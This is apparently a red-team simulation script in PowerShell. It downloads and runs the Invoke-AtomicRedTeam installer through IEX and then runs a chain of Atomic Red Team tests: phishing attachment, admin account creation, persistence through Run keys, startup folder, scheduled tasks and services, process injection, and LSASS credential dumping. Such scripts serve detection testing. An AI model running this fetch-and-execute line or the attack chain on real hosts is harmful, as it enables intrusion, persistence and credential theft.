Write-Output "[+] Installing invoke-atomicredteam"
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics -Force
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force



Write-Output "[+] Starting ART attack simulation"

#region initial access
Write-Output "[+] T1566.001 Atomic Test #1 - Download Macro-Enabled Phishing Attachment"
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.md#atomic-test-1---download-macro-enabled-phishing-attachment
Invoke-AtomicTest T1566.001 -TestNumbers 1

Write-Output '[+] Waiting 2 seconds...'
Start-Sleep -s 2

Write-Output "[+] T1078.003 Atomic Test #1 - Create local account with admin privileges"
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.003/T1078.003.md#atomic-tests
Invoke-AtomicTest T1078.003 -TestNumbers 1

Write-Output '[+] Waiting 2 seconds...'
Start-Sleep -s 2
#endregion initial access

#region execution
Write-Output "[+] T1059.001 Atomic Test #11 - PowerShell Fileless Script Execution"
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-11---powershell-fileless-script-execution
Invoke-AtomicTest T1059.001 -TestNumbers 11

Write-Output '[+] Waiting 2 seconds...'
Start-Sleep -s 2
#endregion execution

#region persistence
Write-Output "[+] T1547.001 Atomic Test #1 - Reg Key Run"
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-1---reg-key-run
Invoke-AtomicTest T1547.001 -TestNumbers 1

Write-Output '[+] Waiting 2 seconds...'
Start-Sleep -s 2

Write-Output "[+] T1547.001 Atomic Test #6 - Suspicious bat file run from startup Folder"
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-6---suspicious-bat-file-run-from-startup-folder
Invoke-AtomicTest T1547.001 -TestNumbers 6

Write-Output '[+] Waiting 2 seconds...'
Start-Sleep -s 2
		
Write-Output "[+] T1053.005 Atomic Test #1 - Scheduled Task Startup Script"
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-1---scheduled-task-startup-script
Invoke-AtomicTest T1053.005 -TestNumbers 1

Write-Output '[+] Waiting 2 seconds...'
Start-Sleep -s 2

Write-Output "[+] T1543.003 Atomic Test #2 - Service Installation CMD"
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md#atomic-test-2---service-installation-cmd
Invoke-AtomicTest T1543.003 -TestNumbers 2

Write-Output '[+] Waiting 2 seconds...'
Start-Sleep -s 2
#endregion persistence

#region defense evasion

Write-Output "[+] T1055.001 Atomic Test #1 - Process Injection via mavinject.exe"
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.001/T1055.001.md#atomic-test-1---process-injection-via-mavinjectexe
Invoke-AtomicTest T1055.001 -TestNumbers 1

Write-Output '[+] Waiting 2 seconds...'
Start-Sleep -s 2

Write-Output "[+] T1070.004 Atomic Test #6 - Delete a single file - Windows PowerShell"
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md#atomic-test-6---delete-a-single-file---windows-powershell
Invoke-AtomicTest T1070.004 -TestNumbers 6 -GetPrereqs
Invoke-AtomicTest T1070.004 -TestNumbers 6

Write-Output '[+] Waiting 2 seconds...'
Start-Sleep -s 2
#endregion defense evasion

#region credential access
Write-Output "[+] T1003.001 Atomic Test #1 - Credential Dumping: LSASS Memory using procdump.exe"
Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 1
#endregion credential access

Write-Output '[+] Attacks completed! Enjoy :)'
